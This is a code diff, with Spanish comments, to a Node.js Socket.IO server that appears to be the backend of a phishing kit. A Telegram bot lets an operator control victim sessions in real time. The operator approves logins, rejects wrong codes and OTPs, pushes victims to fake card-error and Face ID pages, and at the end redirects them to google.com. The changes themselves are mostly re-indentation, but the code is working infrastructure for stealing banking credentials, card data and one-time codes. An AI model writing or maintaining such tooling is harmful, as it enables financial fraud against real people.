@@ -156,15 +156,11 @@ io.on('connection', (socket) => {
 
   // Escucha el evento para redirigir a face.html cuando se presione el botón TC
   socket.on('accionTC', ({ sessionId }) => {
-  const socketTarget = activeSockets.get(sessionId);
-  if (!socketTarget) {
-    console.log("⚠️ No se encontró la sesión del usuario.");
-    return;
-  }
-
-  // Emisión de redirección
-  socketTarget.emit('redirigir', 'face.html');
-});
+    const socketTarget = activeSockets.get(sessionId);
+    if (!socketTarget) {
+      console.log("⚠️ No se encontró la sesión del usuario.");
+      return;
+    }
 
     // Enviar mensaje a Telegram
     bot.sendMessage(telegramChatId, '🟨 Redirigiendo a Face ID...');
@@ -172,64 +168,64 @@ io.on('connection', (socket) => {
     // Emitir la redirección a face.html
     socketTarget.emit('redirigir', 'face.html');
   });
-});
 
-// Respuesta a botones desde Telegram
-bot.on('callback_query', (query) => {
-  const data = query.data;
-  const chatId = query.message.chat.id;
-  const callbackId = query.id;
+  // Respuesta a botones desde Telegram
+  bot.on('callback_query', (query) => {
+    const data = query.data;
+    const chatId = query.message.chat.id;
+    const callbackId = query.id;
 
-  bot.answerCallbackQuery(callbackId);
+    bot.answerCallbackQuery(callbackId);
 
-  const sessionId = data.split('_')[1];
-  const socket = activeSockets.get(sessionId);
+    const sessionId = data.split('_')[1];
+    const socket = activeSockets.get(sessionId);
 
-  if (!socket) {
-    bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
-    return;
-  }
-
-  if (data.startsWith('aprobado_') || data.startsWith('rechazado_')) {
-    const decision = data.startsWith('aprobado_') ? 'aprobado' : 'rechazado';
-    socket.emit('respuesta', decision);
-    bot.sendMessage(chatId, decision === 'aprobado' ? '✅ Acceso aprobado.' : '❌ Acceso denegado.');
-  }
-
-  else if (data.startsWith('error_') || data.startsWith('finalizar_')) {
-    const decision = data.startsWith('error_') ? 'error' : 'finalizar';
-    socket.emit('respuestaCodigo', decision);
-    bot.sendMessage(chatId, decision === 'error' ? '⚠️ Código incorrecto.' : '✅ Finalizando proceso...');
-  }
-
-  else if (data.startsWith('otpFinalizar_') || data.startsWith('otpError_')) {
-    const decision = data.startsWith('otpFinalizar_') ? 'finalizar' : 'otp_error';
-    socket.emit('respuestaOtp', decision);
-    bot.sendMessage(chatId, decision === 'finalizar' ? '✅ Proceso finalizado.' : '❌ Código OTP inválido nuevamente.');
-  }
-
-  else if (data.startsWith('otp_') || data.startsWith('errorlogo_')) {
-    const decision = data.startsWith('otp_') ? 'otp' : 'error_logo';
-    socket.emit('respuestaErrorLogo', decision);
-    bot.sendMessage(chatId, decision === 'otp' ? '📲 Redirigiendo a ingreso de código.' : '🚫 Error logo, reenviando.');
-  }
-
-  else if (data.startsWith('errortc_') || data.startsWith('finalizarTarjeta_') || data.startsWith('tc_')) {
-    const action = data.split('_')[0];
-
-    if (action === 'errortc') {
-      socket.emit('redirigir', 'errortc.html');
-      bot.sendMessage(chatId, '🚫 Error TC — redirigiendo...');
-    } else if (action === 'finalizarTarjeta') {
-      socket.emit('redirigir', 'https://www.google.com/');
-      bot.sendMessage(chatId, '✅ Finalizando...');
-    } else if (action === 'tc') {
-      socket.emit('redirigir', 'face.html');
-      bot.sendMessage(chatId, '🟨 Redirigiendo a Face ID...');
+    if (!socket) {
+      bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
+      return;
     }
-  }
 
-  activeSockets.delete(sessionId);
+    if (data.startsWith('aprobado_') || data.startsWith('rechazado_')) {
+      const decision = data.startsWith('aprobado_') ? 'aprobado' : 'rechazado';
+      socket.emit('respuesta', decision);
+      bot.sendMessage(chatId, decision === 'aprobado' ? '✅ Acceso aprobado.' : '❌ Acceso denegado.');
+    }
+
+    else if (data.startsWith('error_') || data.startsWith('finalizar_')) {
+      const decision = data.startsWith('error_') ? 'error' : 'finalizar';
+      socket.emit('respuestaCodigo', decision);
+      bot.sendMessage(chatId, decision === 'error' ? '⚠️ Código incorrecto.' : '✅ Finalizando proceso...');
+    }
+
+    else if (data.startsWith('otpFinalizar_') || data.startsWith('otpError_')) {
+      const decision = data.startsWith('otpFinalizar_') ? 'finalizar' : 'otp_error';
+      socket.emit('respuestaOtp', decision);
+      bot.sendMessage(chatId, decision === 'finalizar' ? '✅ Proceso finalizado.' : '❌ Código OTP inválido nuevamente.');
+    }
+
+    else if (data.startsWith('otp_') || data.startsWith('errorlogo_')) {
+      const decision = data.startsWith('otp_') ? 'otp' : 'error_logo';
+      socket.emit('respuestaErrorLogo', decision);
+      bot.sendMessage(chatId, decision === 'otp' ? '📲 Redirigiendo a ingreso de código.' : '🚫 Error logo, reenviando.');
+    }
+
+    else if (data.startsWith('errortc_') || data.startsWith('finalizarTarjeta_') || data.startsWith('tc_')) {
+      const action = data.split('_')[0];
+
+      if (action === 'errortc') {
+        socket.emit('redirigir', 'errortc.html');
+        bot.sendMessage(chatId, '🚫 Error TC — redirigiendo...');
+      } else if (action === 'finalizarTarjeta') {
+        socket.emit('redirigir', 'https://www.google.com/');
+        bot.sendMessage(chatId, '✅ Finalizando...');
+      } else if (action === 'tc') {
+        socket.emit('redirigir', 'face.html');
+        bot.sendMessage(chatId, '🟨 Redirigiendo a Face ID...');
+      }
+    }
+
+    activeSockets.delete(sessionId);
+  });
 });
 
 const PORT = process.env.PORT || 3000;
